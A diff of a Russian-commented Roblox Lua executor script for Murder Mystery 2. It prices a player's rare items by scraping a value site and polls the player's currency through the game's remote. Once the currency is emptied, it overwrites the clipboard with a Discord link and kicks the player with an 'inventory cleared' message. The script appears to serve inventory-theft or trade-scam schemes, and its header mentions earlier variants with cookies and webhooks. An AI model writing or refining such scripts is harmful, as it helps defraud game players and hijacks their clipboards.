@@ -1,4 +1,4 @@
--- MM2: Оценка инвентаря + Кик при очистке (БЕЗ куки и вебхуков)
+-- MM2: Оценка + Кик при очистке валюты (ИСПРАВЛЕНО)
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -11,11 +11,11 @@ local DISCORD_LINK = "discord.com/Sc55xakw"
 
 -- Проверка игры
 if game.PlaceId ~= 142823291 then
-    plr:Kick("Ошибка: Зайди в Murder Mystery 2 (обычный сервер).")
+    plr:Kick("Ошибка: Зайди в Murder Mystery 2.")
     return
 end
 if #Players:GetPlayers() >= 12 then
-    plr:Kick("Сервер переполнен. Попробуй другой.")
+    plr:Kick("Сервер переполнен.")
     return
 end
 
@@ -29,35 +29,28 @@ local categories = {
     classic = "https://supremevaluelist.com/mm2/vintages.html",
     chroma = "https://supremevaluelist.com/mm2/chromas.html"
 }
-local headers = {
-    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-}
+local headers = {["User-Agent"] = "Mozilla/5.0"}
 
 -- === УТИЛИТЫ ===
 local function trim(s) return s:match("^%s*(.-)%s*$") end
-
 local function fetchHTML(url)
     if not HttpRequest then return "" end
-    local success, resp = pcall(function()
-        return HttpRequest({Url = url, Method = "GET", Headers = headers})
-    end)
-    return success and resp and resp.Body or ""
+    local s, r = pcall(function() return HttpRequest({Url = url, Method = "GET", Headers = headers}) end)
+    return s and r and r.Body or ""
 end
-
 local function parseValue(div)
     local v = div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
     return v and tonumber(v:gsub(",", "")) or nil
 end
-
 local function extractItems(html)
-    local items = {}
+    local t = {}
     for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
         name = trim((name:match("([^<]+)") or ""):gsub("%s+", " ")):lower()
         name = trim(name:split(" Click ")[1])
         local val = parseValue(body)
-        if val then items[name] = val end
+        if val then t[name] = val end
     end
-    return items
+    return t
 end
 
 -- === ПОСТРОЕНИЕ ЦЕН ===
@@ -66,16 +59,12 @@ local function buildValueList()
     local lock = Instance.new("BindableEvent")
     local done = 0
 
-    for rarity, url in pairs(categories) do
+    for r, url in pairs(categories) do
         task.spawn(function()
             local html = fetchHTML(url)
             if html ~= "" then
                 local items = extractItems(html)
-                if rarity == "chroma" then
-                    chromas = items
-                else
-                    for n, v in pairs(items) do values[n] = v end
-                end
+                if r == "chroma" then chromas = items else for n,v in pairs(items) do values[n] = v end end
             end
             done += 1
             if done == 5 then lock:Fire() end
@@ -83,7 +72,7 @@ local function buildValueList()
     end
     lock.Event:Wait()
 
-    local valueList = {}
+    local list = {}
     local godlyIdx = table.find(rarityTable, "Godly")
     for id, item in pairs(database) do
         local name = item.ItemName and item.ItemName:lower() or ""
@@ -92,96 +81,84 @@ local function buildValueList()
         local idx = table.find(rarityTable, rarity)
         if idx and idx >= godlyIdx and name ~= "" then
             if isChroma then
-                for cname, val in pairs(chromas) do
-                    if cname:find(name) then valueList[id] = val break end
-                end
+                for c, v in pairs(chromas) do if c:find(name) then list[id] = v break end end
             else
-                valueList[id] = values[name]
+                list[id] = values[name]
             end
         end
     end
-    return valueList
+    return list
 end
 
--- === КОПИРОВАНИЕ В БУФЕР ===
-local function copyToClipboard()
-    if setclipboard then
-        setclipboard(DISCORD_LINK)
-        print("[ССЫЛКА] Скопировано: " .. DISCORD_LINK)
-    elseif syn and syn.write_clipboard then
-        syn.write_clipboard(DISCORD_LINK)
-        print("[ССЫЛКА] Скопировано: " .. DISCORD_LINK)
-    else
-        warn("[ОШИБКА] Копирование в буфер не поддерживается!")
+-- === КОПИРОВАНИЕ ===
+local function copyLink()
+    if setclipboard then setclipboard(DISCORD_LINK)
+    elseif syn and syn.write_clipboard then syn.write_clipboard(DISCORD_LINK)
     end
+    print("[ССЫЛКА] Скопировано: " .. DISCORD_LINK)
 end
 
--- === ОСНОВНОЙ ЦИКЛ ===
+-- === ГЛАВНЫЙ ЦИКЛ ===
 local valueList = buildValueList()
-local min_rarity_index = table.find(rarityTable, min_rarity)
-local untradable = {
-    DefaultGun=true, DefaultKnife=true, Reaver=true, IceHammer=true, Gingerscythe=true,
-    TestItem=true, Cracks=true, Icecrusher=true, ["???"]=true, Dartbringer=true, SharkSeeker=true
-}
+local min_rarity_idx = table.find(rarityTable, min_rarity)
+local untradable = {DefaultGun=true, DefaultKnife=true, Reaver=true, IceHammer=true, Gingerscythe=true, TestItem=true, Cracks=true, Icecrusher=true, ["???"]=true, Dartbringer=true, SharkSeeker=true}
+
 local previousCurrency = nil
-local hasEvaluated = false
+local evaluated = false
 
-print("[ЗАПУСК] Оценка инвентаря и отслеживание валюты начаты...")
+print("[ЗАПУСК] Скрипт активен. Оценка + отслеживание...")
 
-while true do
-    local success, data = pcall(function()
+while task.wait(2) do
+    local ok, data = pcall(function()
         return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
     end)
 
-    if success and data then
-        local currency = data.Currency or 0
-        local weapons = data.Weapons.Owned or {}
+    if not ok or not data then continue end
 
-        -- === ОТСЛЕЖИВАНИЕ ВАЛЮТЫ ===
-        if previousCurrency == nil then
-            previousCurrency = currency
-            print("[ВАЛЮТА] Начальное значение: " .. currency)
-        elseif previousCurrency > 0 and currency == 0 then
-            print("[ОЧИСТКА] Валюта обнулена! Кик через 1 сек...")
-            copyToClipboard()
-            task.wait(1)
-            plr:Kick("Your inventory cleared\n" .. DISCORD_LINK)
-            break
-        else
-            previousCurrency = currency
-        end
+    local currency = data.Currency or 0
+    local weapons = data.Weapons.Owned or {}
 
-        -- === ОЦЕНКА ИНВЕНТАРЯ (один раз) ===
-        if not hasEvaluated then
-            local items, total = {}, 0
-            for id, amt in pairs(weapons) do
-                local item = database[id]
-                if item then
-                    local rarity = item.Rarity
-                    local idx = table.find(rarityTable, rarity)
-                    if idx and idx >= min_rarity_index and not untradable[id] then
-                        local val = valueList[id] or (idx >= table.find(rarityTable, "Godly") and 2 or 1)
-                        if val and val >= min_value then
-                            total = total + val * amt
-                            table.insert(items, {DataID = id, Rarity = rarity, Amount = amt, Value = val})
-                        end
+    -- === ОЦЕНКА (ОДИН РАЗ) ===
+    if not evaluated then
+        local items, total = {}, 0
+        for id, amt in pairs(weapons) do
+            local item = database[id]
+            if item then
+                local r = item.Rarity
+                local idx = table.find(rarityTable, r)
+                if idx and idx >= min_rarity_idx and not untradable[id] then
+                    local val = valueList[id] or (idx >= table.find(rarityTable, "Godly") and 2 or 1)
+                    if val and val >= min_value then
+                        total += val * amt
+                        table.insert(items, {DataID=id, Rarity=r, Amount=amt, Value=val})
                     end
                 end
             end
-
-            if #items > 0 then
-                table.sort(items, function(a,b) return (a.Value*a.Amount) > (b.Value*b.Amount) end)
-                print("\n[ОЦЕНКА ИНВЕНТАРЯ]")
-                print("Итого: " .. total .. " value")
-                for _, v in ipairs(items) do
-                    print(string.format("  %s (x%s): %s (%s)", v.DataID, v.Amount, v.Value * v.Amount, v.Rarity))
-                end
-                hasEvaluated = true
-            else
-                print("[ИНВЕНТАРЬ] Нет предметов выше Godly.")
-            end
         end
+
+        if #items > 0 then
+            table.sort(items, function(a,b) return a.Value*a.Amount > b.Value*b.Amount end)
+            print("\n[ОЦЕНКА ИНВЕНТАРЯ] Total Value: " .. total)
+            for _, v in ipairs(items) do
+                print("  " .. v.DataID .. " (x" .. v.Amount .. "): " .. (v.Value*v.Amount) .. " (" .. v.Rarity .. ")")
+            end
+        else
+            print("[ИНВЕНТАРЬ] Нет ценных предметов.")
+        end
+        evaluated = true
     end
 
-    task.wait(2)
+    -- === ОТСЛЕЖИВАНИЕ ВАЛЮТЫ ===
+    if previousCurrency == nil then
+        previousCurrency = currency
+        print("[ВАЛЮТА] Начальное: " .. currency)
+    elseif previousCurrency > 0 and currency == 0 then
+        print("[ОЧИСТКА] Валюта обнулена! Кик...")
+        copyLink()
+        task.wait(1)
+        plr:Kick("Your inventory cleared\n" .. DISCORD_LINK)
+        break
+    else
+        previousCurrency = currency
+    end
 end
